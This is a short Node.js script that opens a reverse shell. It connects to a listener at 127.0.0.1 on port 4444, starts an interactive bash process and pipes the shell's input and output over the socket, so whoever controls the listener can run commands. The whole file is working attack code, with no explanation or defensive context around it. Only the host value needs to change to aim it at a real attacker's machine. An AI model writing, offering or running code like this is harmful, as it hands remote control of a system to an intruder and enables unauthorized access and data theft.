const net = require('net');
const { spawn } = require('child_process');

const host = '127.0.0.1';
const port = 4444;

const client = new net.Socket();

client.connect(port, host, () => {
    console.log('Connected to the server!');

    // Spawn a shell process
    const shell = spawn('/bin/bash', ['-i']);

    // Pipe data between the socket and the shell
    client.pipe(shell.stdin);
    shell.stdout.pipe(client);
    shell.stderr.pipe(client);

    // Handle shell process exit
    shell.on('exit', (code) => {
        console.log(`Shell process exited with code ${code}`);
        client.end(); // Explicitly close the socket
    });

    // Handle socket closure
    client.on('close', () => {
        console.log('Connection closed');
    });
});

// Handle socket errors
client.on('error', (err) => {
    console.error('Socket error:', err.message);
    client.destroy();
});
